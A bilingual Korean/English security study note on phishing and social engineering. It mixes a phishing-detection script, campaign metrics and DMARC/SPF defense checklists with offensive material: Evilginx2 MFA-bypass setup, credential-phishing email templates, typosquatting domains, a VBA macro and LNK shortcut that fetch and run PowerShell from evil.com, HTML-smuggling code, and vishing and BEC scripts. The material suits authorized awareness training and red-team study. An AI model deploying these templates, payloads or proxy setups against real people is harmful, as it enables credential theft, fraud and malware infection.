> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# 피싱 및 사회공학 공격

## 0. 초보자를 위한 개념 이해

### 피싱 및 사회공학이란?

사회공학(Social Engineering)은 기술적 취약점이 아닌 사람의 심리를 이용해 비밀 정보나 시스템 접근을 얻는 공격 기법입니다. 이메일 피싱, 전화 비싱(Vishing), 가짜 로그인 페이지 등이 대표적입니다. 통계적으로 기업 침해 사고의 70~90%가 피싱으로 시작되며, 기술적 방어만큼 직원 보안 인식 교육이 중요한 이유입니다.

**왜 배우는가:**
```
피싱 공격의 현실:

  기업 보안 통계:
    침해 사고 80%+ → 피싱으로 시작
    랜섬웨어 70%    → 이메일 첨부파일/링크
    BEC 사기        → 연간 $27억+ 피해 (2022)

  심리적 취약점 활용:
    긴박감  → "지금 즉시 비밀번호 변경 필요!"
    권위    → "CEO입니다. 지금 바로 계좌 이체하세요"
    호기심  → "당신의 급여 정보.xlsx"
    두려움  → "계정 해킹됨. 지금 복구하세요"

  방어:
    직원 훈련 + 피싱 시뮬레이션 (이 파일의 핵심)
    기술: DMARC/SPF/DKIM + MFA
```

### 핵심 개념 정리

```
피싱 공격 유형:

  스피어 피싱 (Spear Phishing)
    → 특정 개인/조직 맞춤형 (LinkedIn 정보 활용)
    → 일반 피싱보다 성공률 3배 이상

  웨일링 (Whaling)
    → 임원(고래) 대상 맞춤형 스피어 피싱
    → CFO, CEO 타겟 → 대규모 금융 사기

  BEC (Business Email Compromise)
    → CEO 이메일 계정 탈취 또는 유사 도메인
    → 긴급 계좌 이체 요청

  Vishing (Voice Phishing)
    → IT 지원팀 사칭 전화 → 패스워드/OTP 요청

보안 인식 훈련 (허가된 시뮬레이션):
  GoPhish → 피싱 캠페인 시뮬레이션
  직원 클릭률 측정 → 취약 그룹 추가 교육
```

### 필요한 도구 및 환경
- **GoPhish**: 오픈소스 피싱 시뮬레이션 플랫폼 (허가된 환경)
- **SET (Social Engineer Toolkit)**: 사회공학 공격 프레임워크
- **Python smtplib**: 이메일 발송 자동화
- **허가 필수**: 본인 조직 또는 명시적 동의 받은 환경에서만 사용

### 기초 실습 예제
```python
#!/usr/bin/env python3
"""피싱 이메일 탐지 — 의심스러운 이메일 특징 분석."""

from dataclasses import dataclass, field
import re


@dataclass
class EmailAnalysis:
    sender: str
    subject: str
    body: str
    links: list[str] = field(default_factory=list)
    risk_score: float = 0.0
    risk_factors: list[str] = field(default_factory=list)


def analyze_email_for_phishing(
    sender: str,
    subject: str,
    body: str,
) -> EmailAnalysis:
    """이메일의 피싱 위험 지표를 분석합니다."""
    analysis = EmailAnalysis(sender=sender, subject=subject, body=body)

    # URL 추출
    url_pattern = r'https?://[^\s<>"\']+|www\.[^\s<>"\']+'
    analysis.links = re.findall(url_pattern, body)

    # 위험 지표 확인
    urgency_keywords = ["즉시", "긴급", "지금", "만료", "24시간", "urgent", "immediately"]
    for kw in urgency_keywords:
        if kw.lower() in (subject + body).lower():
            analysis.risk_score += 15
            analysis.risk_factors.append(f"긴박감 키워드: '{kw}'")
            break

    # 의심 도메인 확인 (typosquatting)
    trusted_domains = ["google.com", "microsoft.com", "kakao.com", "naver.com"]
    for link in analysis.links:
        for trusted in trusted_domains:
            domain_part = trusted.split(".")[0]
            if domain_part in link and trusted not in link:
                analysis.risk_score += 30
                analysis.risk_factors.append(f"타이포스쿼팅 의심: {link}")

    # URL 단축 서비스
    shorteners = ["bit.ly", "tinyurl", "t.co", "ow.ly"]
    for link in analysis.links:
        if any(s in link for s in shorteners):
            analysis.risk_score += 20
            analysis.risk_factors.append("URL 단축 서비스 사용")

    return analysis


if __name__ == "__main__":
    result = analyze_email_for_phishing(
        sender="security@micros0ft.com",
        subject="[긴급] 귀하의 계정이 해킹되었습니다!",
        body="즉시 링크를 클릭하여 확인하세요: http://micros0ft-verify.com/login",
    )
    print(f"위험 점수: {result.risk_score}")
    print(f"위험 요인:")
    for factor in result.risk_factors:
        print(f"  - {factor}")
```

---

## 사회공학 공격 분류

```
인간 심리 취약점 활용:
  긴박감 (Urgency)     → "지금 즉시 비밀번호 변경!"
  권위 (Authority)     → "CEO입니다. 즉시 처리하세요"
  호기심 (Curiosity)   → "당신의 급여 명세서.xlsx"
  두려움 (Fear)        → "계정이 해킹되었습니다"
  탐욕 (Greed)         → "당신이 선발되었습니다"
  친밀감 (Familiarity) → 동료/상사 사칭
```

---

## 1. 피싱 인프라 구성

### GoPhish 피싱 플랫폼


GoPhish 피싱 시뮬레이션 플랫폼 설정 명령어입니다. 관리자 패널에서 발송 프로파일·이메일 템플릿·랜딩 페이지를 설정하고 캠페인을 실행하면 직원의 피싱 인식 수준과 클릭률을 측정할 수 있습니다.

```bash
# GoPhish 설치
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
unzip gophish-v0.12.1-linux-64bit.zip
chmod +x gophish

# 설정 파일
cat > config.json << 'EOF'
{
    "admin_server": {
        "listen_url": "127.0.0.1:3333",
        "use_tls": true,
        "cert_path": "gophish_admin.crt",
        "key_path": "gophish_admin.key"
    },
    "phish_server": {
        "listen_url": "0.0.0.0:443",
        "use_tls": true,
        "cert_path": "phish.crt",
        "key_path": "phish.key"
    },
    "db_name": "sqlite3",
    "db_path": "gophish.db"
}
EOF

./gophish
# 관리 패널: https://127.0.0.1:3333
# 기본 계정: admin / (실행 시 출력)
```

### 피싱 도메인 준비

타이포스쿼팅 도메인을 검색하여 피싱 캠페인에 사용할 도메인을 준비합니다. 목표 도메인과 시각적으로 유사한 도메인을 등록합니다.

```bash
# 타이포스쿼팅 도메인 탐색
# company.com → conpany.com, cornpany.com, company.co, etc.
dnstwist company.com

# 구매 후 DNS 설정
# A 레코드: 피싱 서버 IP
# MX 레코드: 이메일 서버
# SPF: v=spf1 ip4:PHISH_IP ~all
# DKIM: 메일 서버 설정
# DMARC: v=DMARC1; p=none; rua=mailto:admin@phish.com

# SSL 인증서 발급 (신뢰도 향상)
certbot certonly --standalone -d phish-domain.com
```

### 전문적인 피싱 이메일 템플릿

IT 보안 팀을 사칭한 피싱 이메일 HTML 템플릿입니다. 긴급성과 권위감을 이용하여 피해자가 링크를 클릭하거나 자격증명을 입력하도록 유도합니다.

```html
<!-- IT 보안 팀 사칭 피싱 이메일 -->
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
</head>
<body style="font-family: Arial, sans-serif;">
    <div style="max-width: 600px; margin: 0 auto; border: 1px solid #ddd;">
        <!-- 헤더 -->
        <div style="background: #0078d4; padding: 20px;">
            <img src="https://phish-domain.com/logo.png" 
                 alt="Company Logo" width="150">
        </div>
        
        <!-- 본문 -->
        <div style="padding: 30px;">
            <p>안녕하세요 {{.FirstName}}님,</p>
            
            <p>IT 보안팀입니다. 귀하의 계정에서 <strong>의심스러운 로그인 시도</strong>가
            감지되었습니다.</p>
            
            <p><strong>감지된 로그인 정보:</strong></p>
            <ul>
                <li>시간: {{.Now}}</li>
                <li>위치: 러시아 모스크바</li>
                <li>기기: Unknown Device</li>
            </ul>
            
            <p>귀하의 계정이 아니라면 즉시 비밀번호를 변경하세요:</p>
            
            <div style="text-align: center; margin: 30px 0;">
                <a href="{{.URL}}" 
                   style="background: #0078d4; color: white; padding: 15px 30px; 
                          text-decoration: none; border-radius: 5px;">
                    비밀번호 즉시 변경
                </a>
            </div>
            
            <p>24시간 내 조치하지 않으면 계정이 잠깁니다.</p>
            
            <p>감사합니다,<br>
            IT 보안팀</p>
        </div>
        
        <!-- 푸터 -->
        <div style="background: #f5f5f5; padding: 15px; font-size: 11px; color: #666;">
            이 이메일은 자동 발송되었습니다. 문의: security@company.com
        </div>
    </div>
</body>
</html>
```

---

## 2. 자격증명 수집 페이지

### Microsoft 365 피싱 페이지 클론

HTTrack으로 Microsoft 365 로그인 페이지를 복제합니다. 피싱 페이지를 통해 입력된 자격증명을 캡처하는 크리덴셜 하비스팅에 사용합니다.

```bash
# HTTrack으로 로그인 페이지 복제
httrack "https://login.microsoftonline.com" -O ./clone/

# 또는 wget
wget --mirror --convert-links --page-requisites \
    https://login.microsoftonline.com/

# Evilginx2 (리버스 프록시 방식 - 실제 자격증명 캡처)
```

### Evilginx2 설정

Evilginx2는 역방향 프록시 방식으로 MFA도 우회하는 피싱 프레임워크입니다. Phishlets로 대상 서비스를 모방하고 세션 쿠키를 탈취합니다.

```bash
# Evilginx2 설치
git clone https://github.com/kgretzky/evilginx2
cd evilginx2
make build
./bin/evilginx

# 설정
config domain phishmail.com
config ip PHISH_SERVER_IP

# Microsoft 365 phishlet 활성화
phishlets hostname o365 login.phishmail.com
phishlets enable o365

# lure 생성 (피싱 URL)
lures create o365
lures get-url 0

# 캡처된 세션 확인
sessions  # 자격증명 + 쿠키 확인
sessions 1  # 세션 상세 (쿠키로 세션 하이재킹 가능)
```

---

## 3. 스피어 피싱 (Targeted Phishing)

### OSINT으로 개인화된 피싱 준비

```bash
# 타겟 정보 수집
# LinkedIn: 직함, 업무, 관심사
# Twitter/X: 개인 관심사
# Facebook: 가족 정보
# GitHub: 기술 스택

# 개인화 요소:
# - 실명 사용
# - 실제 동료 이름 언급
# - 실제 프로젝트/업무 내용
# - 최근 행사/회의 언급
# - 실제 회사 도메인처럼 보이는 주소

# OSINT 자동화
python3 theHarvester.py -d company.com -l 500 -b all
recon-ng
shodan search "company.com"
```

### BEC (Business Email Compromise)

```
CEO 사기 시나리오:
  1. CEO LinkedIn에서 정보 수집
  2. CFO 이메일 스푸핑 (from CEO처럼)
  3. "급한 계좌 이체" 요청
  4. 실제 CEO처럼 보이는 이메일 주소 사용

이메일 헤더 스푸핑:
  From: CEO Name <ceo@company.com>
  Reply-To: ceo@company-secure.com  # 공격자 주소
  
SPF/DKIM 우회 기법:
  - From 도메인과 다른 도메인으로 전송
  - 유사 도메인 (company.co vs company.com)
  - Display name 속임 (CEO Name <attacker@gmail.com>)
```

---

## 4. 악성 문서 (Phishing Attachment)

### 매크로 기반 Office 문서

악성 VBA 매크로를 포함한 Office 문서를 생성합니다. 피해자가 매크로를 활성화하면 셸코드나 파워셸 명령이 실행되어 초기 접근을 획득합니다.

```vba
' VBA 매크로 (Office 2010-2016 환경)
Sub AutoOpen()
    Dim wsh As Object
    Set wsh = CreateObject("WScript.Shell")
    
    ' PowerShell 페이로드 실행
    wsh.Run "powershell.exe -ep bypass -nop -w hidden -c """ & _
        "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')" & _
        """", 0, False
End Sub
```

```python
#!/usr/bin/env python3
"""악성 Office 문서 생성"""

from maldocx import MalDocx

# DOCX 악성 문서 생성
doc = MalDocx()
doc.set_payload("msfvenom -p windows/x64/meterpreter/reverse_https...")
doc.set_decoy_content("재무 보고서 3분기.docx")
doc.generate("악성_문서.docx")
```

### HTML Smuggling

HTML Smuggling으로 방화벽과 이메일 게이트웨이를 우회합니다. JavaScript로 바이너리를 동적으로 재조립하여 악성 파일을 피해자 브라우저에 전달합니다.

```html
<!DOCTYPE html>
<html>
<body>
<!-- HTML Smuggling: 브라우저에서 직접 파일 생성 -->
<script>
function downloadPayload() {
    // Base64로 인코딩된 페이로드
    var payload = "UEsDBBQAAAAI...";  // Base64 encoded exe
    
    // Blob으로 변환
    var byteCharacters = atob(payload);
    var byteArrays = [];
    for (var i = 0; i < byteCharacters.length; i++) {
        byteArrays.push(byteCharacters.charCodeAt(i));
    }
    var blob = new Blob([new Uint8Array(byteArrays)], 
                       {type: 'application/octet-stream'});
    
    // 자동 다운로드
    var link = document.createElement('a');
    link.href = URL.createObjectURL(blob);
    link.download = 'Invoice_2024.exe';
    link.click();
}

window.onload = downloadPayload;
</script>
<h1>문서를 확인 중입니다...</h1>
</body>
</html>
```

### LNK 파일 페이로드

악성 LNK(바로가기) 파일을 생성합니다. 클릭 시 PowerShell이나 cmd를 통해 원격 페이로드를 다운로드하고 실행합니다.

```powershell
# PowerShell로 악성 LNK 생성
$wsh = New-Object -ComObject WScript.Shell
$shortcut = $wsh.CreateShortcut("$env:TEMP\Resume.lnk")
$shortcut.TargetPath = "cmd.exe"
$shortcut.Arguments = '/c powershell.exe -ep bypass -nop -w hidden -c "IEX (iwr http://evil.com/payload.ps1)"'
$shortcut.IconLocation = "C:\Windows\System32\imageres.dll,77"  # PDF 아이콘
$shortcut.Description = "Resume_2024.pdf"
$shortcut.Save()
```

---

## 5. 사회공학 전화 (Vishing)

### Vishing 스크립트

```
시나리오: IT 지원 팀 사칭

공격자: "안녕하세요, IT 지원팀 김민준입니다. 
         현재 귀하의 컴퓨터에서 보안 경고가 발생했습니다."

피해자: "어, 저는 특별한 게 없는데요..."

공격자: "네, 경고는 백그라운드에서 발생합니다. 
         저희가 원격으로 확인해드리겠습니다.
         화면에 'Windows + R'을 누르시겠어요?"

피해자: "눌렀어요"

공격자: "그 다음 'mstsc'를 입력하시면 됩니다..." 
         (실제로는 공격자 서버로 연결 유도)

핵심:
  - 권위 (IT팀)
  - 긴박감 (보안 경고)
  - 기술 지식으로 신뢰 구축
  - 점진적 정보 요청
```

---

## 6. 피싱 시뮬레이션 측정 지표


피싱 공격 자동화 스크립트입니다. 개인화된 스피어피싱 이메일을 대량 발송하거나, 피해자의 반응(클릭, 자격증명 입력)을 추적하는 서버를 구성하는 데 활용됩니다.

```python
#!/usr/bin/env python3
"""피싱 시뮬레이션 결과 분석"""

import json
from datetime import datetime

class PhishingMetrics:
    def __init__(self, campaign_data: dict):
        self.data = campaign_data
    
    def calculate_kpis(self) -> dict:
        total = self.data['sent']
        opened = self.data['opened']
        clicked = self.data['clicked']
        submitted = self.data['submitted']
        reported = self.data['reported']
        
        return {
            'open_rate': round(opened / total * 100, 1),
            'click_rate': round(clicked / total * 100, 1),
            'submission_rate': round(submitted / total * 100, 1),
            'reporting_rate': round(reported / total * 100, 1),
            'susceptibility_score': round((clicked / total) * 100, 1),
        }
    
    def get_risk_level(self, click_rate: float) -> str:
        if click_rate < 5:
            return "낮음 (우수)"
        elif click_rate < 15:
            return "보통 (개선 필요)"
        elif click_rate < 30:
            return "높음 (즉각 교육 필요)"
        else:
            return "매우 높음 (긴급 대응 필요)"
    
    def generate_report(self) -> str:
        kpis = self.calculate_kpis()
        risk = self.get_risk_level(kpis['click_rate'])
        
        report = f"""
# 피싱 시뮬레이션 결과 보고서

## 캠페인 요약
- 발송: {self.data['sent']}명
- 열람: {self.data['opened']}명 ({kpis['open_rate']}%)
- 클릭: {self.data['clicked']}명 ({kpis['click_rate']}%)
- 자격증명 입력: {self.data['submitted']}명 ({kpis['submission_rate']}%)
- 신고: {self.data['reported']}명 ({kpis['reporting_rate']}%)

## 위험도 평가: {risk}

## 부서별 결과
"""
        if 'by_department' in self.data:
            for dept, stats in self.data['by_department'].items():
                dept_rate = stats['clicked'] / stats['sent'] * 100
                report += f"  - {dept}: {dept_rate:.1f}%\n"
        
        return report

# 사용 예시
campaign = {
    'sent': 500,
    'opened': 350,
    'clicked': 87,
    'submitted': 43,
    'reported': 12,
    'by_department': {
        '재무팀': {'sent': 50, 'clicked': 15},
        '영업팀': {'sent': 100, 'clicked': 22},
        'IT팀': {'sent': 80, 'clicked': 5},
        '임원진': {'sent': 20, 'clicked': 8},
    }
}

metrics = PhishingMetrics(campaign)
print(metrics.generate_report())
```

---

## 7. 피싱 방어 체계

```
기술적 방어:
  □ DMARC (p=reject) 설정
  □ SPF 레코드 설정
  □ DKIM 서명
  □ 이메일 게이트웨이 (샌드박스 분석)
  □ URL 클릭 전 검사
  □ 첨부파일 가상환경 실행
  □ 브라우저 격리 (Remote Browser Isolation)
  □ MFA (자격증명 탈취 후 접근 방지)

교육적 방어:
  □ 분기별 피싱 시뮬레이션
  □ 즉각적 피드백 훈련
  □ 피싱 신고 메커니즘 (버튼 클릭으로 간편 신고)
  □ 클릭 시 교육 페이지 자동 표시
  □ 경영진 대상 BEC 특화 훈련

절차적 방어:
  □ 금융 이체 2인 승인
  □ 급한 요청 시 전화 확인 절차
  □ 대역 외 인증 채널
```

---

<!-- detect-validate-17 -->
## 피싱 탐지와 방어 검증

피싱·사회공학은 *어떻게 사람을 속이는가*를 다루지만, 방어자는 **각 기법이 이메일 인증·게이트웨이·사용자 신고 어디에 흔적을 남기는가**와 **SPF/DKIM/DMARC 가 실제로 스푸핑을 막는가**를 검증해야 한다.

### 공격 → 계층 → 통제(방어자) → 탐지 신호

| 기법 | 노리는 계층 | 1차 통제(방어자) | 탐지 신호 |
|---|---|---|---|
| 도메인 스푸핑 | 발신자 신뢰 | SPF/DKIM/DMARC | DMARC 실패, 정렬 불일치 |
| 유사 도메인(타이포스쿼팅) | 시각적 신뢰 | 도메인 모니터링 | 신규 유사 도메인, 동형문자 |
| 악성 첨부/링크 | 콘텐츠 실행 | 샌드박스, URL 재작성 | 매크로 문서, 리디렉션 체인 |
| 자격증명 수집 | 인증 입력 | MFA, 피싱저항 인증 | 위장 로그인 폼, 신규 호스팅 |

### 방어 검증 (직접 확인)

```bash
# 도메인 스푸핑 방어(SPF/DKIM/DMARC)가 실제 게시됐는지 검증(소유 도메인)
dig +short TXT example.com | grep -i 'v=spf1' || echo 'NO SPF'
dig +short TXT _dmarc.example.com | grep -i 'v=DMARC1' || echo 'NO DMARC'
# DMARC 정책이 p=none 이면 모니터만 — p=quarantine/reject 여야 스푸핑 실제 차단
```

> 검증은 **승인된 교전·소유 도메인·통제 환경**에서만(RoE·동의 준수). "DMARC 게시"와 "스푸핑 메일을 실제 거부한다"는 다르다 — 정책이 p=reject 인지, 모의 피싱이 게이트웨이에 잡히는지 확인한다([[33_OSINT_Social_Engineering]], [[13_SOC_Blue_Team]]).

**최신 기법·통제 (2025–2026):**
- AI 생성 피싱·딥페이크 보이스로 정교화 — 탐지·아웃오브밴드 확인. 검증: 훈련 캠페인이 통제·동의하에 수행되는가([[33_OSINT_Social_Engineering]])
- MFA 피싱(AiTM·토큰탈취) 확산 — 피싱저항 MFA(FIDO2)가 강제되는지 확인

---

<a name="english"></a>

# Phishing and Social Engineering Attacks

## Social Engineering Attack Classification

```
Social Engineering Taxonomy:
  
  Technical:
    Phishing (email-based)
    Smishing (SMS-based)
    Vishing (voice-based)
    Spear Phishing (targeted)
    Whaling (C-level targeting)
    BEC (Business Email Compromise)
  
  Physical:
    Pretexting (impersonation)
    Baiting (USB drops, etc.)
    Tailgating (physical access)
    Dumpster Diving (document collection)
  
  Combined:
    Hybrid attacks (email + phone + physical)
```

---

## 1. Phishing Infrastructure Setup

### GoPhish Campaign Setup

```bash
# GoPhish installation
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
unzip gophish-v0.12.1-linux-64bit.zip
./gophish

# Dashboard: https://localhost:3333
# Default credentials: admin / gophish

# Campaign components:
# 1. Sending Profile (SMTP settings)
# 2. Landing Page (credential capture page)
# 3. Email Template
# 4. User & Group (target list)
# 5. Campaign (combine all above)
```

### Email Template Design

```html
<!-- Convincing phishing email template -->
Subject: [URGENT] Your account will be suspended - Action Required

Dear {{.FirstName}},

Our security team has detected unusual activity on your account.
To prevent unauthorized access, please verify your credentials immediately.

<a href="{{.URL}}">Verify Account Now</a>

This link expires in 24 hours.

Best regards,
IT Security Team
```

---

## 2. Credential Harvesting

```bash
# Evilginx2 — reverse proxy phishing (bypasses 2FA)
# Captures actual session cookies, not just credentials

# Installation
git clone https://github.com/kgretzky/evilginx2
cd evilginx2
make

# Configure phishlet
evilginx> phishlets hostname microsoft your-domain.com
evilginx> phishlets enable microsoft

# Create lure
evilginx> lures create microsoft
evilginx> lures get-url 0

# View captured sessions
evilginx> sessions
evilginx> sessions 1  # View specific session details
```

---

## 3. Spear Phishing OSINT

```python
#!/usr/bin/env python3
"""Spear phishing target research automation"""
import requests
import json

def gather_target_intel(name: str, company: str, email: str) -> dict:
    """Collect target intelligence for spear phishing"""
    
    intel = {
        "target": {"name": name, "company": company, "email": email},
        "findings": []
    }
    
    # LinkedIn-style search (via search engines)
    search_queries = [
        f'"{name}" "{company}" site:linkedin.com',
        f'"{name}" "{company}" filetype:pdf',
        f'"{email}" site:github.com',
        f'"{name}" "{company}" "conference" OR "presentation"',
    ]
    
    intel["search_queries"] = search_queries
    
    # Email breach check (HaveIBeenPwned-style)
    intel["breach_check_url"] = f"https://haveibeenpwned.com/api/v3/breachedaccount/{email}"
    
    return intel

def create_pretexting_scenario(intel: dict) -> str:
    """Create pretexting scenario based on gathered intelligence"""
    
    import anthropic
    client = anthropic.Anthropic()
    
    prompt = f"""
Based on the following target intelligence, create a realistic pretexting scenario
for an authorized red team social engineering exercise.

Target: {intel['target']['name']}
Company: {intel['target']['company']}

Create:
1. Pretext story (who you're impersonating)
2. Conversation script
3. Requested action (callback phone number, visit link, etc.)
4. Urgency factor

Keep it realistic but clearly marked as an exercise.
"""
    
    resp = client.messages.create(
        model="claude-opus-4-6",
        max_tokens=1000,
        messages=[{"role": "user", "content": prompt}]
    )
    
    return resp.content[0].text
```

---

## 4. Vishing (Voice Phishing)

```
Vishing Script Template:

"Hello, this is [Name] from IT security team. 
We've detected unauthorized access attempts on your account 
and need to verify your identity to protect your data.

Could you please confirm:
1. Your employee ID
2. The last 4 digits of your badge number
3. Your current location (for security verification)

This will only take 2 minutes and protects your account."

Psychological Triggers Used:
  - Authority (IT Security Team)
  - Urgency (unauthorized access detected)
  - Reciprocity (protecting their account)
  - Social proof (standard security procedure)
```

---

## 5. BEC (Business Email Compromise)

```bash
# BEC scenario types:
# 1. CEO Fraud — impersonate CEO, request wire transfer
# 2. Invoice Fraud — spoof vendor, change payment details
# 3. Attorney Impersonation — impersonate lawyer, request confidential info
# 4. Data Theft — impersonate HR, request employee W-2 forms

# Email spoofing check
# Check if target domain has SPF, DKIM, DMARC
dig TXT target.com | grep -E "spf|dmarc"
dig TXT _dmarc.target.com

# If no DMARC: spoofed emails may deliver
# If DMARC=none: monitoring only, no blocking
# If DMARC=quarantine/reject: harder to spoof
```

---

## 6. Defenses Against Social Engineering

```
Technical Defenses:
  □ DMARC/DKIM/SPF email authentication
  □ Email gateway with phishing detection (Proofpoint, Mimecast)
  □ Browser isolation for suspicious links
  □ MFA enforcement (phishing-resistant: FIDO2/WebAuthn preferred)
  □ DNS filtering (block malicious domains)

Training Defenses:
  □ Regular phishing simulation campaigns
  □ Phishing reporting mechanism (one-click reporting button)
  □ Auto-display education page on click
  □ Executive-specific BEC training

Procedural Defenses:
  □ Dual approval for financial transfers
  □ Phone verification for urgent requests
  □ Out-of-band authentication channels
```

<!-- detect-validate-17 -->
## Phishing Detection and Defense Validation

Phishing/social engineering describe *how people are deceived*, but defenders must verify **where each leaves traces (email auth, gateway, user reports)** and **whether SPF/DKIM/DMARC actually block spoofing**.

### Attack -> Layer -> Control (defender) -> Detection signal

| Technique | Targeted layer | Primary control (defender) | Detection signal |
|---|---|---|---|
| Domain spoofing | Sender trust | SPF/DKIM/DMARC | DMARC failures, alignment mismatch |
| Lookalike (typosquatting) | Visual trust | Domain monitoring | New similar domains, homoglyphs |
| Malicious attachment/link | Content execution | Sandbox, URL rewriting | Macro docs, redirect chains |
| Credential harvesting | Auth input | MFA, phishing-resistant auth | Fake login forms, newly hosted sites |

### Defense validation (verify directly)

```bash
# Verify domain-spoofing defenses (SPF/DKIM/DMARC) are actually published (own domain)
dig +short TXT example.com | grep -i 'v=spf1' || echo 'NO SPF'
dig +short TXT _dmarc.example.com | grep -i 'v=DMARC1' || echo 'NO DMARC'
# p=none means monitor only — p=quarantine/reject is required to actually block spoofing
```

> Validate only on **authorized engagements / owned domains / controlled environments** (follow RoE and consent). "Published DMARC" differs from "actually rejects spoofed mail" — confirm p=reject and that simulated phishing is caught at the gateway ([[33_OSINT_Social_Engineering]], [[13_SOC_Blue_Team]]).
